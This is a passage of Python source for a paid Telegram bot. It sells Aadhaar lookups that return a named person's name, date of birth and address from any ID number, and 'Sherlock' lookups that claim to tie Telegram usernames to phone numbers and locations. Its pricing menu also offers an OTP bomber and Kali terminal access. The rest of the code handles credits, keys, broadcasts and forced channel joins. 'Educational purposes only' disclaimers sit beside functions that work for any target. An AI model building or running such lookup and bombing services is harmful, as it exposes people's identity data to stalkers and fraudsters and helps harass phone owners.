            bot.reply_to(m, f"❌ API Error: Status {response.status_code}", parse_mode='HTML')
    
    except Exception as e:
        bot.reply_to(m, f"❌ Error: {str(e)}\nCredit was not deducted.", parse_mode='HTML')

@bot.message_handler(func=lambda m: m.text == "🕵️ Sherlock Lookup")
@rate_limit_and_ban_check
def sherlock_lookup_button(m):
    bot.reply_to(
        m,
        "🕵️ <b>Sherlock Phone Finder</b>\n\n"
        "Find phone numbers associated with Telegram usernames.\n\n"
        "<b>Usage:</b> /sherlock username\n\n"
        "<b>Examples:</b>\n"
        "/sherlock john_doe\n"
        "/sherlock alice123\n"
        "/sherlock bob_smith\n\n"
        "💡 <b>Note:</b> Requires 1 credit per lookup\n\n"
        "🔍 <b>Information Provided:</b>\n"
        "• Phone number (if available)\n"
        "• Carrier information\n"
        "• Location data\n"
        "• Registration date\n\n"
        "⚠️ <b>Important:</b>\n"
        "This tool respects privacy and only works with publicly available data.",
        parse_mode='HTML'
    )

# ==========================================
# 🔍 AADHAAR INFO LOOKUP
# ==========================================
@bot.message_handler(commands=['aadhaar', 'adhar'])
@rate_limit_and_ban_check
@feature_check("aadhaar_lookup")
def aadhaar_lookup(m):
    uid = m.from_user.id
    
    # Check channel joins first
    joined, channel = check_all_channels_join(uid)
    if not joined:
        show_channels_to_join(m, uid)
        return
    
    # Get input
    try:
        aadhaar = m.text.split()[1]
        if not aadhaar.isdigit() or len(aadhaar) != 12:
            raise ValueError
    except:
        bot.reply_to(m, "📌 <b>Usage:</b> /aadhaar 123456789012\n\n⚠️ <b>Note:</b> This is for educational purposes only!", parse_mode='HTML')
        return
    
    # Check credits
    user_info = users_db.get(str(uid), {})
    if user_info.get('credits', 0) < 2:
        bot.reply_to(
            m,
            f"❌ <b>Insufficient Credits!</b>\n\n"
            f"You have {user_info.get('credits', 0)} credits.\n"
            f"Aadhaar lookup requires 2 credits.\n\n"
            f"Get more credits by:\n"
            f"• Waiting for daily bonus (5 credits/day)\n"
            f"• Referring friends (2 credits each)\n"
            f"• Buying premium packages",
            parse_mode='HTML'
        )
        return
    
    # Warning message
    warning_msg = (
        "⚠️ <b>LEGAL DISCLAIMER</b> ⚠️\n\n"
        "This tool is for <b>EDUCATIONAL PURPOSES ONLY</b>.\n"
        "Unauthorized access to Aadhaar information is illegal.\n"
        "Use only your own Aadhaar number for testing.\n\n"
        "By using this tool, you agree that:\n"
        "1. You will not misuse this information\n"
        "2. You take full responsibility for your actions\n"
        "3. This is for educational/research purposes only\n\n"
        "Do you want to continue?"
    )
    
    mk = types.InlineKeyboardMarkup()
    mk.add(
        types.InlineKeyboardButton("✅ Yes, I Understand", callback_data=f"aadhaar_yes_{aadhaar}"),
        types.InlineKeyboardButton("❌ Cancel", callback_data="aadhaar_no")
    )
    
    bot.reply_to(m, warning_msg, reply_markup=mk, parse_mode='HTML')

@bot.callback_query_handler(func=lambda c: c.data.startswith("aadhaar_"))
@rate_limit_and_ban_check_cb
def aadhaar_confirm(c):
    if c.data == "aadhaar_no":
        bot.answer_callback_query(c.id, "❌ Lookup cancelled.")
        bot.delete_message(c.message.chat.id, c.message.message_id)
        return
    
    if c.data.startswith("aadhaar_yes_"):
        aadhaar = c.data.split("aadhaar_yes_")[1]
        uid = c.from_user.id
        
        # Deduct credits
        if str(uid) in users_db:
            users_db[str(uid)]['credits'] = max(0, users_db[str(uid)].get('credits', 0) - 2)
            save_database(USERS_DB_FILE, users_db)
        
        bot.answer_callback_query(c.id, "🔍 Fetching Aadhaar details...")
        bot.edit_message_text("🔍 Fetching Aadhaar details... Please wait...", c.message.chat.id, c.message.message_id, parse_mode='HTML')
        
        # Call API from database
        api_url = apis_db.get("AADHAAR_API", APIS["AADHAAR_API"])
        
        try:
            response = requests.get(f"{api_url}{aadhaar}", timeout=30)
            
            if response.status_code == 200:
                data = response.json()
                
                # Format response
                formatted_text = (
                    f"✅ <b>Aadhaar Details Found</b>\n\n"
                    f"🔢 <b>Aadhaar Number:</b> {aadhaar}\n"
                    f"📅 <b>Fetch Date:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
                )
                
                if isinstance(data, dict):
                    # Format common aadhaar fields
                    fields = {
                        'name': '👤 Name',
                        'gender': '⚥ Gender',
                        'dob': '🎂 Date of Birth',
                        'address': '📍 Address',
                        'photo': '📸 Photo Available',
                        'status': '📊 Status'
                    }
                    
                    for key, display_name in fields.items():
                        if key in data and data[key]:
                            formatted_text += f"<b>{display_name}:</b> {data[key]}\n"
                    
                    # Add masked aadhaar
                    masked_aadhaar = f"{aadhaar[:4]}****{aadhaar[-4:]}"
                    formatted_text += f"\n🔒 <b>Masked Aadhaar:</b> {masked_aadhaar}\n"
                
                else:
                    formatted_text += "<b>Raw API Response:</b>\n"
                    formatted_text += f"<code>{json.dumps(data, indent=2, ensure_ascii=False)[:1500]}</code>\n\n"
                
                formatted_text += f"\n⚠️ <b>Disclaimer:</b> Educational use only!\n"
                formatted_text += f"👑 <b>Developer:</b> {OWNER_USERNAME}"
                
                bot.edit_message_text(formatted_text, c.message.chat.id, c.message.message_id, parse_mode='HTML')
                
                # Log to group (with masked aadhaar for privacy)
                uname = f"@{c.from_user.username}" if c.from_user.username else f"ID:{uid}"
                masked = f"{aadhaar[:4]}****{aadhaar[-4:]}"
                log_to_group(f"🔍 AADHAAR LOOKUP\n👤 User: {uname}\n🆔 User ID: {uid}\n🔢 Aadhaar: {masked}")
            
            else:
                bot.edit_message_text(
                    f"❌ <b>API Error!</b>\n\n"
                    f"Status Code: {response.status_code}\n"
                    f"Response: {response.text[:500]}",
                    c.message.chat.id,
                    c.message.message_id,
                    parse_mode='HTML'
                )
        
        except Exception as e:
            bot.edit_message_text(
                f"❌ <b>Error fetching details:</b>\n{str(e)}\n\nCredits have been refunded.",
                c.message.chat.id,
                c.message.message_id,
                parse_mode='HTML'
            )
            
            # Refund credit
            if str(uid) in users_db:
                users_db[str(uid)]['credits'] = users_db[str(uid)].get('credits', 0) + 2
                save_database(USERS_DB_FILE, users_db)

@bot.message_handler(func=lambda m: m.text == "🔍 Aadhaar Info")
@rate_limit_and_ban_check
def aadhaar_button(m):
    bot.reply_to(
        m,
        "🔍 <b>Aadhaar Information Lookup</b>\n\n"
        "<b>Usage:</b> /aadhaar 123456789012\n\n"
        "⚠️ <b>Important:</b>\n"
        "• Requires 2 credits per lookup\n"
        "• For educational purposes only\n"
        "• Use only your own Aadhaar number\n"
        "• Unauthorized access is illegal\n\n"
        "💡 <b>Get credits by:</b>\n"
        "• Daily bonus (5 credits/day)\n"
        "• Referrals (2 credits each)\n"
        "• Premium packages",
        parse_mode='HTML'
    )

# ==========================================
# 🔑 REDEEM KEY SYSTEM - FIXED
# ==========================================
@bot.message_handler(func=lambda m: m.text == "🔑 Redeem Key")
@rate_limit_and_ban_check
def redeem_key_menu(m):
    uid = m.from_user.id
    
    # Check channel joins first
    joined, channel = check_all_channels_join(uid)
    if not joined:
        show_channels_to_join(m, uid)
        return
    
    action_sessions[uid] = "redeem_key"
    bot.reply_to(
        m,
        "🔑 <b>Redeem Your Key</b>\n\n"
        "Enter your key code in the format:\n"
        "<code>King-XXXX-XXXX-XXXX</code>\n\n"
        "Or other valid key formats.\n\n"
        "Press /cancel to cancel.",
        parse_mode='HTML'
    )

@bot.message_handler(func=lambda m: action_sessions.get(m.from_user.id) == "redeem_key")
@rate_limit_and_ban_check
def redeem_key_process(m):
    uid = m.from_user.id
    key = m.text.strip().upper()
    
    if key == '/CANCEL':
        if uid in action_sessions:
            del action_sessions[uid]
        bot.reply_to(m, "❌ Key redemption cancelled.", parse_mode='HTML')
        return
    
    # Check if key exists and not used
    if key in keys_db and not keys_db[key].get('used', False):
        key_data = keys_db[key]
        key_type = key_data['type']
        value = key_data['value']
        
        if key_type == "PREM":
            # Premium key
            expiry = (datetime.now() + timedelta(days=value)).isoformat()
            subs_db[str(uid)] = {'expiry': expiry}
            save_database(SUBS_DB_FILE, subs_db)
            msg = f"🎉 <b>Premium Activated!</b>\n⏰ <b>Duration:</b> {value} Days"
        
        elif key_type == "CREDIT":
            # Credit key
            if str(uid) in users_db:
                users_db[str(uid)]['credits'] = users_db[str(uid)].get('credits', 0) + value
                save_database(USERS_DB_FILE, users_db)
            msg = f"💰 <b>Credits Added!</b>\n➕ <b>Amount:</b> +{value} Credits"
        
        else:
            msg = "❌ Invalid key type"
            bot.reply_to(m, msg, parse_mode='HTML')
            return
        
        # Mark key as used
        keys_db[key]['used'] = True
        keys_db[key]['used_by'] = uid
        keys_db[key]['used_date'] = datetime.now().isoformat()
        save_database(KEYS_DB_FILE, keys_db)
        
        # Log redemption
        uname = f"@{m.from_user.username}" if m.from_user.username else f"ID:{uid}"
        log_to_group(f"🔑 KEY REDEEMED\n👤 User: {uname}\n🆔 User ID: {uid}\n🔑 Key: {key}\n📊 Type: {key_type}\n💎 Value: {value}")
        
        bot.reply_to(m, f"✅ {msg}", parse_mode='HTML')
    
    else:
        bot.reply_to(m, "❌ <b>Invalid or Already Used Key!</b>\n\nCheck the key and try again.", parse_mode='HTML')
    
    if uid in action_sessions:
        del action_sessions[uid]

# ==========================================
# 💎 PRICING
# ==========================================
@bot.message_handler(func=lambda m: m.text == "💎 Pricing")
@rate_limit_and_ban_check
def pricing(m):
    uid = m.from_user.id
    
    # Check channel joins first
    joined, channel = check_all_channels_join(uid)
    if not joined:
        show_channels_to_join(m, uid)
        return
    
    pricing_text = (
        f"💎 <b>PREMIUM PLANS</b> 💎\n"
        "══════════════════════════════\n\n"
        "🟢 <b>7 Days Premium</b> - ₹200\n"
        "• Unlimited File Hosting\n"
        "• Kali Terminal Access\n"
        "• VPS Manager Access\n"
        "• Instagram Video Downloader\n"
        "• Priority Support\n"
        "• OTP Bomber Access\n\n"
        "🔵 <b>30 Days Premium</b> - ₹600\n"
        "• All 7-day features\n"
        "• Extended support\n"
        "• Backup priority\n"
        "• Custom bot features\n"
        "• VIP Channel Access\n\n"
        "🟣 <b>60 Days Premium</b> - ₹1,100\n"
        "• All 30-day features\n"
        "• VIP support channel\n"
        "• Dedicated resources\n"
        "• Early access to updates\n"
        "• Custom Tool Development\n\n"
        "🟡 <b>Lifetime Offer</b> - DM for price\n"
        "• Permanent access\n"
        "• Lifetime updates\n"
        "• VIP status\n"
        "• Custom solutions\n"
        "• Bot Whitelabel\n\n"
        "💳 <b>Payment Methods:</b>\n"
        "• UPI\n"
        "• PayPal\n"
        "• Crypto (BTC/USDT)\n\n"
        f"📲 <b>Contact:</b> {OWNER_USERNAME}\n\n"
        "✨ <b>All users get:</b>\n"
        "• 5 Daily credits\n"
        "• C to Binary compiler\n"
        "• File hosting (1 file free)\n"
        "• Number lookup service\n"
        "• Vehicle lookup (2 credits)\n"
        "• Sherlock lookup (1 credit)\n"
        "• Aadhaar lookup (2 credits)\n"
        "• Referral system with auto rewards\n"
        "• Temp Mail System (Free)"
    )
    
    bot.reply_to(m, pricing_text, parse_mode='HTML')

# ==========================================
# 👑 OWNER PANEL - ENHANCED WITH API MANAGEMENT
# ==========================================
@bot.message_handler(func=lambda m: m.text == "👑 Owner Panel")
@rate_limit_and_ban_check
def owner_panel(m):
    uid = m.from_user.id
    
    if uid != ADMIN_ID:
        bot.reply_to(m, "❌ You are not authorized to access this panel!", parse_mode='HTML')
        return
    
    mk = types.InlineKeyboardMarkup(row_width=2)
    mk.add(
        types.InlineKeyboardButton("🔑 Gen Key", callback_data="op_gen_key"),
        types.InlineKeyboardButton("📊 Statistics", callback_data="op_stats")
    )
    mk.add(
        types.InlineKeyboardButton("📢 Broadcast", callback_data="op_broadcast"),
        types.InlineKeyboardButton("👤 User Mgmt", callback_data="op_user_mgmt")
    )
    mk.add(
        types.InlineKeyboardButton("📦 Requirements", callback_data="op_requirements"),
        types.InlineKeyboardButton("📢 Channel Mgmt", callback_data="op_channel_mgmt")
    )
    mk.add(
        types.InlineKeyboardButton("🗑 Delete Key", callback_data="op_delete_key"),
        types.InlineKeyboardButton("🔄 Update All", callback_data="op_update_all")
    )
    mk.add(
        types.InlineKeyboardButton("🚀 Admin Kali", callback_data="op_admin_kali"),
        types.InlineKeyboardButton("⚡ Admin VPS", callback_data="op_admin_vps")
    )
    mk.add(
        types.InlineKeyboardButton("🔧 Feature Control", callback_data="op_feature_control"),
        types.InlineKeyboardButton("🌐 API Management", callback_data="op_api_management")
    )
    
    bot.reply_to(m, "👑 <b>OWNER CONTROL PANEL V2</b>\n\nSelect an option:", reply_markup=mk, parse_mode='HTML')

@bot.callback_query_handler(func=lambda c: c.data == "op_gen_key" and c.from_user.id == ADMIN_ID)
@rate_limit_and_ban_check_cb
def op_gen_key(c):
    mk = types.InlineKeyboardMarkup(row_width=2)
    mk.add(
        types.InlineKeyboardButton("🎫 Premium Key", callback_data="op_gen_prem"),
        types.InlineKeyboardButton("💰 Credit Key", callback_data="op_gen_cred")
    )
    mk.add(types.InlineKeyboardButton("🔙 Back", callback_data="op_back"))
    
    bot.edit_message_text(
        "🔑 <b>GENERATE KEY</b>\n\nSelect key type:",
        c.message.chat.id,
        c.message.message_id,
        reply_markup=mk,
        parse_mode='HTML'
    )

@bot.callback_query_handler(func=lambda c: c.data == "op_gen_prem" and c.from_user.id == ADMIN_ID)
@rate_limit_and_ban_check_cb
def gen_premium_key(c):
    action_sessions[c.from_user.id] = "gen_prem_key"
    bot.send_message(c.message.chat.id, "🎫 Enter number of days for premium key:", parse_mode='HTML')

@bot.callback_query_handler(func=lambda c: c.data == "op_gen_cred" and c.from_user.id == ADMIN_ID)
@rate_limit_and_ban_check_cb
def gen_credit_key(c):
    action_sessions[c.from_user.id] = "gen_cred_key"
    bot.send_message(c.message.chat.id, "💰 Enter number of credits for credit key:", parse_mode='HTML')

@bot.message_handler(func=lambda m: action_sessions.get(m.from_user.id) in ["gen_prem_key", "gen_cred_key"] and m.from_user.id == ADMIN_ID)
@rate_limit_and_ban_check
def generate_key(m):
    uid = m.from_user.id
    action = action_sessions[uid]
    text = m.text.strip()
    
    if not text.isdigit():
        bot.reply_to(m, "❌ Please enter a valid number", parse_mode='HTML')
        if uid in action_sessions:
            del action_sessions[uid]
        return
    
    value = int(text)
    
    if action == "gen_prem_key":
        key_type = "PREM"
        key_code = f"KING-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}"
        msg = f"🎫 <b>Premium Key Generated!</b>\n\n🔑 <b>Key:</b> <code>{key_code}</code>\n⏰ <b>Days:</b> {value}"
    else:
        key_type = "CREDIT"
        key_code = f"CRED-{random.randint(1000, 9999)}1-{random.randint(1000, 9999)}2-{random.randint(1000, 9999)}3"
        msg = f"💰 <b>Credit Key Generated!</b>\n\n🔑 <b>Key:</b> <code>{key_code}</code>\n💎 <b>Credits:</b> {value}"
    
    # Save to database
    keys_db[key_code] = {
        'type': key_type,
        'value': value,
        'generated_by': ADMIN_ID,
        'generated_date': datetime.now().strftime("%Y-%m-%d"),
        'used': False
    }
    save_database(KEYS_DB_FILE, keys_db)
    
    bot.reply_to(m, msg, parse_mode='HTML')
    log_to_group(f"🔑 KEY GENERATED\n👑 Admin: {m.from_user.first_name}\n🔑 Key: {key_code}\n📊 Type: {key_type}\n💎 Value: {value}")
    
    if uid in action_sessions:
        del action_sessions[uid]

@bot.callback_query_handler(func=lambda c: c.data == "op_stats" and c.from_user.id == ADMIN_ID)
@rate_limit_and_ban_check_cb
def show_stats_callback(c):
    show_stats(c.message)

def show_stats(m):
    # Master DB stats
    total_users = len(users_db)
    total_premium = sum(1 for uid_str in users_db if is_premium(int(uid_str)))
    total_files = len(files_db)
    total_banned = len([uid for uid, ban in bans_db.items() if datetime.fromisoformat(ban['expiry']) > datetime.now()])
    
    # Channel stats
    public_channels = get_channel_count_by_type("public")
    private_channels = get_channel_count_by_type("private")
    total_channels = public_channels + private_channels
    
    total_keys = len([k for k, v in keys_db.items() if not v.get('used', False)])
    
    # User DB stats
    total_credits = sum(user.get('credits', 0) for user in users_db.values())
    total_points = sum(user.get('referral_points', 0) for user in users_db.values())
    total_refs = sum(user.get('total_referrals', 0) for user in users_db.values())
    
    # File stats
    active_processes = sum(len(procs) for procs in running_processes.values())
    
    # Temp mail stats
    total_temp_mails = len(temp_mails_db)
    
    # Feature stats
    enabled_features = sum(1 for feature, enabled in settings_db.get('feature_flags', {}).items() if enabled)
    total_features = len(settings_db.get('feature_flags', {}))
    
    stats_text = (
        "📊 <b>BOT STATISTICS</b>\n"
        "══════════════════════════════\n\n"
        f"👥 <b>Total Users:</b> {total_users}\n"
        f"👑 <b>Premium Users:</b> {total_premium}\n"
        f"📁 <b>Hosted Files:</b> {total_files}\n"
        f"🚫 <b>Banned Users:</b> {total_banned}\n"
        f"📢 <b>Force Channels:</b> {total_channels}\n"
        f"   • Public: {public_channels}/{MAX_PUBLIC_CHANNELS}\n"
        f"   • Private: {private_channels}/{MAX_PRIVATE_CHANNELS}\n"
        f"🔑 <b>Active Keys:</b> {total_keys}\n"
        f"💰 <b>Total Credits:</b> {total_credits}\n"
        f"⭐ <b>Referral Points:</b> {total_points}\n"
        f"🤝 <b>Total Referrals:</b> {total_refs}\n"
        f"⚡ <b>Active Processes:</b> {active_processes}\n"
        f"📧 <b>Temp Mails:</b> {total_temp_mails}\n"
        f"🔧 <b>Enabled Features:</b> {enabled_features}/{total_features}\n\n"
        f"📅 <b>Date:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
    )
    
    bot.reply_to(m, stats_text, parse_mode='HTML')

@bot.callback_query_handler(func=lambda c: c.data == "op_broadcast" and c.from_user.id == ADMIN_ID)
@rate_limit_and_ban_check_cb
def broadcast_menu(c):
    action_sessions[c.from_user.id] = "broadcast"
    bot.send_message(
        c.message.chat.id,
        "📢 <b>BROADCAST MESSAGE</b>\n\n"
        "Send the message you want to broadcast to all users.\n\n"
        "You can send:\n"
        "• Text message\n"
        "• Photo with caption\n"
        "• Document with caption\n\n"
        "Type /cancel to cancel.",
        parse_mode='HTML'
    )

@bot.message_handler(func=lambda m: action_sessions.get(m.from_user.id) == "broadcast" and m.from_user.id == ADMIN_ID)
@rate_limit_and_ban_check
def broadcast_message(m):
    uid = m.from_user.id
    
    if m.text == '/cancel':
        if uid in action_sessions:
            del action_sessions[uid]
        bot.reply_to(m, "❌ Broadcast cancelled.", parse_mode='HTML')
        return
    
    # Start broadcast process
    msg = bot.reply_to(m, "📢 <b>Starting broadcast to all users...</b>", parse_mode='HTML')
    
    total_users = len(users_db)
    sent = 0
    failed = 0
    
    def send_broadcast():
        nonlocal sent, failed
        
        for user_id_str in users_db:
            try:
                user_id = int(user_id_str)
                
                # Skip banned users
                if is_banned(user_id)[0]:
                    continue
                
                # Try to send message
                if m.content_type == 'text':
                    bot.send_message(user_id, m.text, parse_mode='HTML')
                elif m.content_type == 'photo':
                    bot.send_photo(user_id, m.photo[-1].file_id, caption=m.caption, parse_mode='HTML')
                elif m.content_type == 'document':
                    bot.send_document(user_id, m.document.file_id, caption=m.caption, parse_mode='HTML')
                
                sent += 1
                time.sleep(0.05)  # Rate limiting to avoid flooding
                
            except Exception as e:
                failed += 1
                print(f"Failed to send to {user_id_str}: {e}")
        
        # Update status
        result_text = (
            f"✅ <b>Broadcast Completed!</b>\n\n"
            f"👥 Total Users: {total_users}\n"
            f"✅ Sent: {sent}\n"
            f"❌ Failed: {failed}\n\n"
            f"📅 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
        )
        
        bot.edit_message_text(result_text, m.chat.id, msg.message_id, parse_mode='HTML')
        log_to_group(f"📢 BROADCAST SENT\n👑 Admin: {m.from_user.first_name}\n👥 Total: {total_users}\n✅ Sent: {sent}\n❌ Failed: {failed}")
    
    # Start broadcast in thread
    threading.Thread(target=send_broadcast, daemon=True).start()
    
    if uid in action_sessions:
        del action_sessions[uid]

@bot.callback_query_handler(func=lambda c: c.data == "op_requirements" and c.from_user.id == ADMIN_ID)
@rate_limit_and_ban_check_cb
def requirements_menu(c):
    mk = types.InlineKeyboardMarkup(row_width=2)
    mk.add(
        types.InlineKeyboardButton("📦 Upload Req", callback_data="op_upload_req"),
        types.InlineKeyboardButton("🔧 Update Modules", callback_data="op_update_modules")
    )
    mk.add(types.InlineKeyboardButton("📋 View Req", callback_data="op_view_req"))
    mk.add(types.InlineKeyboardButton("🔙 Back", callback_data="op_back"))
    
    bot.edit_message_text(
        "📦 <b>REQUIREMENTS MANAGEMENT</b>\n\nSelect an option:",
        c.message.chat.id,
        c.message.message_id,
        reply_markup=mk,
        parse_mode='HTML'
    )

@bot.callback_query_handler(func=lambda c: c.data == "op_upload_req" and c.from_user.id == ADMIN_ID)
@rate_limit_and_ban_check_cb
def upload_req(c):
    action_sessions[c.from_user.id] = "upload_req"
    bot.send_message(
        c.message.chat.id,
        "📦 <b>Upload Global Requirements</b>\n\n"
        "Send me a requirements.txt file.\n"
        "This file will be used for auto-installation of modules for all users.\n\n"
        "Type /cancel to cancel.",
        parse_mode='HTML'
    )

@bot.message_handler(func=lambda m: action_sessions.get(m.from_user.id) == "upload_req" and m.from_user.id == ADMIN_ID, content_types=['document'])
@rate_limit_and_ban_check
def handle_requirements_file(m):
    uid = m.from_user.id
    
    if not m.document or not m.document.file_name.endswith('.txt'):
        bot.reply_to(m, "❌ Please send a .txt file", parse_mode='HTML')
        return
    
    try:
        # Download file
        file_info = bot.get_file(m.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        
        # Save as global requirements
        global_req_path = os.path.join(BASE_DIR, 'global_requirements.txt')
        with open(global_req_path, 'wb') as f:
            f.write(downloaded_file)
        
        # Reload requirements
        load_global_requirements()
        
        # Count modules
        with open(global_req_path, 'r') as f:
            modules = [line.strip() for line in f if line.strip()]
        
        bot.reply_to(
            m,
            f"✅ <b>Global Requirements Updated!</b>\n\n"
            f"📄 <b>File:</b> {m.document.file_name}\n"
            f"📦 <b>Modules:</b> {len(modules)}\n"
            f"📅 <b>Updated:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
            parse_mode='HTML'
        )
        
        log_to_group(f"📦 GLOBAL REQUIREMENTS UPDATED\n👑 Admin: {m.from_user.first_name}\n📄 File: {m.document.file_name}\n📦 Modules: {len(modules)}")
    
    except Exception as e:
        bot.reply_to(m, f"❌ Error: {str(e)}", parse_mode='HTML')
    
    finally:
        if uid in action_sessions:
            del action_sessions[uid]

@bot.callback_query_handler(func=lambda c: c.data == "op_update_modules" and c.from_user.id == ADMIN_ID)
@rate_limit_and_ban_check_cb
def update_modules(c):
    bot.answer_callback_query(c.id, "🔧 Updating system modules...")
    
    try:
        # Update pip
        subprocess.run([sys.executable, '-m', 'pip', 'install', '--upgrade', 'pip'], capture_output=True)
        
        # Install/update required modules
        modules = ['telebot', 'paramiko', 'psutil', 'instaloader', 'yt-dlp', 'requests', 'aiohttp', 'colorama', 'beautifulsoup4']
        for module in modules:
            try:
                subprocess.run([sys.executable, '-m', 'pip', 'install', '--upgrade', module], capture_output=True)
            except:
                pass
        
        bot.send_message(
            c.message.chat.id,
            f"✅ <b>System Modules Updated!</b>\n\n"
            f"Updated modules:\n"
            f"• telebot\n• paramiko\n• psutil\n• instaloader\n• yt-dlp\n• requests\n• aiohttp\n• colorama\n• beautifulsoup4\n\n"
            f"📅 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
            parse_mode='HTML'
        )
        
        log_to_group(f"🔧 SYSTEM MODULES UPDATED\n👑 Admin: {c.from_user.first_name}")
    
    except Exception as e:
        bot.send_message(c.message.chat.id, f"❌ Update error: {str(e)}", parse_mode='HTML')

@bot.callback_query_handler(func=lambda c: c.data == "op_view_req" and c.from_user.id == ADMIN_ID)
@rate_limit_and_ban_check_cb
def view_requirements(c):
    global_req_path = os.path.join(BASE_DIR, 'global_requirements.txt')
    
    if os.path.exists(global_req_path):
        with open(global_req_path, 'r') as f:
            content = f.read()
        
        if len(content) > 4000:
            with open(global_req_path, 'rb') as f:
                bot.send_document(
                    c.message.chat.id,
                    f,
                    caption=f"📦 Global Requirements\n📅 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
                    parse_mode='HTML'
                )
        else:
            bot.send_message(
                c.message.chat.id,
                f"📦 <b>GLOBAL REQUIREMENTS</b>\n\n"
                f"<code>{content}</code>\n\n"
                f"📅 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
                parse_mode='HTML'
            )
    else:
        bot.answer_callback_query(c.id, "❌ No global requirements found", show_alert=True)

@bot.callback_query_handler(func=lambda c: c.data == "op_channel_mgmt" and c.from_user.id == ADMIN_ID)
@rate_limit_and_ban_check_cb
def op_channel_mgmt(c):
    channel_management_menu(c.message)

def channel_management_menu(m):
    """Channel management menu"""
    # Get channel counts
    public_count = get_channel_count_by_type("public")
    private_count = get_channel_count_by_type("private")
    
    mk = types.InlineKeyboardMarkup(row_width=2)
    mk.add(
        types.InlineKeyboardButton("➕ Add Public", callback_data="cm_add_public"),
        types.InlineKeyboardButton("➕ Add Private", callback_data="cm_add_private")
    )
    mk.add(
        types.InlineKeyboardButton("➖ Remove Channel", callback_data="cm_remove"),
        types.InlineKeyboardButton("📋 List Channels", callback_data="cm_list")
    )
    mk.add(
        types.InlineKeyboardButton("🔄 Update All", callback_data="cm_update_all"),
        types.InlineKeyboardButton("🔙 Back", callback_data="op_back")
    )
    
    status_text = f"📊 <b>Channel Status:</b>\n• Public: {public_count}/{MAX_PUBLIC_CHANNELS}\n• Private: {private_count}/{MAX_PRIVATE_CHANNELS}"
    
    bot.reply_to(m, f"📢 <b>CHANNEL MANAGEMENT</b>\n\n{status_text}\n\nSelect an option:", reply_markup=mk, parse_mode='HTML')

@bot.callback_query_handler(func=lambda c: c.data.startswith("cm_") and c.from_user.id == ADMIN_ID)
@rate_limit_and_ban_check_cb
def channel_management_handler(c):
    uid = c.from_user.id
    action = c.data[3:]  # Remove "cm_" prefix
    
    if action == "add_public":
        public_count = get_channel_count_by_type("public")
        if public_count >= MAX_PUBLIC_CHANNELS:
            bot.answer_callback_query(c.id, f"❌ Max {MAX_PUBLIC_CHANNELS} public channels reached!", show_alert=True)
            return
        
        action_sessions[uid] = "add_channel_public"
        bot.send_message(c.message.chat.id, 
                        "➕ <b>Add Public Channel</b>\n\n"
                        "Send channel link in format:\n"
                        "<code>@channel_username https://t.me/channel_username</code>\n\n"
                        "Example:\n"
                        "<code>@KING_channel https://t.me/KING_channel</code>\n\n"
                        "Type /cancel to cancel.",
                        parse_mode='HTML')
    
    elif action == "add_private":
        private_count = get_channel_count_by_type("private")
        if private_count >= MAX_PRIVATE_CHANNELS:
            bot.answer_callback_query(c.id, f"❌ Max {MAX_PRIVATE_CHANNELS} private channels reached!", show_alert=True)
            return
        
        action_sessions[uid] = "add_channel_private"
        bot.send_message(c.message.chat.id, 
                        "➕ <b>Add Private Channel</b>\n\n"
                        "Send private channel link in format:\n"
                        "<code>@private_channel https://t.me/private_channel</code>\n\n"
                        "Example:\n"
                        "<code>@king_private https://t.me/king_private</code>\n\n"
                        "Type /cancel to cancel.",
                        parse_mode='HTML')
    
    elif action == "remove":
        action_sessions[uid] = "remove_channel"
        list_channels_for_removal(c.message)
    
    elif action == "list":
        list_all_channels(c.message)
    
    elif action == "update_all":
        update_all_channels(c.message)
    
    elif action == "back":
        bot.delete_message(c.message.chat.id, c.message.message_id)

@bot.message_handler(func=lambda m: action_sessions.get(m.from_user.id) in ["add_channel_public", "add_channel_private"] and m.from_user.id == ADMIN_ID)
@rate_limit_and_ban_check
def add_channel_process(m):
    uid = m.from_user.id
    action = action_sessions[uid]
    text = m.text.strip()
    
    if text == '/cancel':
        if uid in action_sessions:
            del action_sessions[uid]
        bot.reply_to(m, "❌ Channel addition cancelled.", parse_mode='HTML')
        return
    
    try:
        parts = text.split()
        if len(parts) < 2:
            raise ValueError("Invalid format")
        
        channel_username = parts[0]
        channel_link = parts[1]
        
        if not channel_username.startswith('@'):
            channel_username = '@' + channel_username
        
        # Validate channel link
        if not channel_link.startswith('https://t.me/'):
            raise ValueError("Channel link must start with https://t.me/")
        
        # Determine channel type
        channel_type = "public" if action == "add_channel_public" else "private"
        
        # Check if channel already exists
        for channel in force_channels:
            if channel['channel_username'] == channel_username:
                bot.reply_to(m, f"❌ Channel {channel_username} already exists!", parse_mode='HTML')
                if uid in action_sessions:
                    del action_sessions[uid]
                return
        
        # Check limit
        count = get_channel_count_by_type(channel_type)
        max_limit = MAX_PUBLIC_CHANNELS if channel_type == "public" else MAX_PRIVATE_CHANNELS
        
        if count >= max_limit:
            bot.reply_to(m, f"❌ Max {max_limit} {channel_type} channels reached!", parse_mode='HTML')
            if uid in action_sessions:
                del action_sessions[uid]
            return
        
        # Add channel
        new_channel = {
            "channel_username": channel_username,
            "channel_link": channel_link,
            "channel_type": channel_type,
            "added_by": uid,
            "added_date": datetime.now().strftime("%Y-%m-%d")
        }
        force_channels.append(new_channel)
        save_database(FORCE_CHANNELS_FILE, force_channels)
        
        bot.reply_to(
            m,
            f"✅ <b>Channel Added Successfully!</b>\n\n"
            f"📢 <b>Channel:</b> {channel_username}\n"
            f"🔗 <b>Link:</b> {channel_link}\n"
            f"📊 <b>Type:</b> {channel_type.capitalize()}\n"
            f"📅 <b>Added:</b> {datetime.now().strftime('%Y-%m-%d')}",
            parse_mode='HTML'
        )
        
        log_to_group(f"📢 CHANNEL ADDED\n👑 Admin: {m.from_user.first_name}\n📢 Channel: {channel_username}\n🔗 Link: {channel_link}\n📊 Type: {channel_type}")
    
    except Exception as e:
        bot.reply_to(m, f"❌ Error: {str(e)}\n\nUse format: @channel_username https://t.me/channel_link", parse_mode='HTML')
    
    finally:
        if uid in action_sessions:
            del action_sessions[uid]

def list_channels_for_removal(m):
    """List all channels for removal"""
    if not force_channels:
